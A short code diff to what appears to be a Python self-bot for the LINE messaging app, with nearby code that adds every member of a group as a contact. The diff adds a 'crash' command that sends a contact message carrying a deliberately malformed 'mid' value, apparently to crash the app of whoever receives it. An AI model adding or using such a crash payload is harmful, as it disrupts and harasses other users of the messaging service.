@@ -598,7 +598,12 @@ def bot(op):
 		mi_d = Mids[:33]
 		cl.findAndAddContactsByMids(mi_d)
 		cl.sendText(msg.to,"Success Add all")
-#--------------------------------------------------------
+#====================================================
+            elif msg.text.lower() == "crash":
+                msg.contentType = 13
+                msg.contentMetadata = {'mid': "c33b66e4b7709e54a6fe6eced6e57c157',"}
+                cl.sendMessage(msg)
+#====================================================
 	    elif "Recover" in msg.text:
 		thisgroup = cl.getGroups([msg.to])
 		Mids = [contact.mid for contact in thisgroup[0].members]
